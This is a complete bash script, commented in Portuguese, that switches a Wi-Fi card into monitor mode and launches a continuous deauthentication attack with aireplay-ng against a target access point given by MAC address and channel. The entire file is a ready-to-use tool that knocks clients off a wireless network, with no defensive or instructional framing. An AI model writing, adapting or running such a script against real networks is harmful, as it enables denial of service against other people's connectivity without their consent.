#!/bin/bash

# Verifica se é root
if [ "$EUID" -ne 0 ]; then
    echo "Erro: Este script deve ser executado como root (use sudo)."
    exit 1
fi

# Ajuda
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    echo "Uso: $0 -i <interface> -m <MAC_do_AP> -c <canal>"
    echo "  -i   Interface Wi-Fi (ex: wlan0, wlx...)"
    echo "  -m   MAC address do AP alvo"
    echo "  -c   Canal onde o AP esta operando"
    exit 0
fi

# Inicializa variaveis
INTERFACE=""
BSSID=""
CHANNEL=""

# Parse dos argumentos
while getopts "i:m:c:" opt; do
    case $opt in
        i) INTERFACE="$OPTARG" ;;
        m) BSSID="$OPTARG" ;;
        c) CHANNEL="$OPTARG" ;;
        *) echo "Opcao invalida. Use -h para ajuda."; exit 1 ;;
    esac
done

# Verifica se todos os parametros foram fornecidos
if [ -z "$INTERFACE" ] || [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "Erro: Interface, MAC e canal sao obrigatorios."
    echo "Exemplo: $0 -i wlan0 -m AA:BB:CC:DD:EE:FF -c 6"
    exit 1
fi

# Verifica se a interface existe
if ! ip link show "$INTERFACE" > /dev/null 2>&1; then
    echo "Erro: Interface $INTERFACE nao encontrada."
    exit 1
fi

# Verifica se a interface ja esta em modo monitor
CURRENT_TYPE=$(iw dev "$INTERFACE" info 2>/dev/null | grep type | awk '{print $2}')
if [ "$CURRENT_TYPE" == "monitor" ]; then
    echo "Interface $INTERFACE ja esta em modo monitor."
    MONITOR_INTERFACE="$INTERFACE"
else
    echo "Colocando $INTERFACE em modo monitor..."
    ip link set "$INTERFACE" down
    iw dev "$INTERFACE" set type monitor
    ip link set "$INTERFACE" up
    MONITOR_INTERFACE="$INTERFACE"
fi

# Sintoniza o canal correto
echo "Ajustando para o canal $CHANNEL..."
iw dev "$MONITOR_INTERFACE" set channel "$CHANNEL"

# Funcao de limpeza
cleanup() {
    echo ""
    echo "Encerrando ataque..."
    kill $AIRPLAY_PID 2>/dev/null
    if [ "$CURRENT_TYPE" != "monitor" ]; then
        echo "Restaurando modo gerenciado..."
        ip link set "$MONITOR_INTERFACE" down
        iw dev "$MONITOR_INTERFACE" set type managed
        ip link set "$MONITOR_INTERFACE" up
    fi
    systemctl restart NetworkManager 2>/dev/null
    echo "Finalizado."
    exit 0
}

trap cleanup INT TERM

# Inicia o ataque de deauth continuo
echo "Iniciando ataque de deauth contra $BSSID no canal $CHANNEL"
echo "Pressione Ctrl+C para parar"

sudo aireplay-ng -0 0 -a "$BSSID" "$MONITOR_INTERFACE"
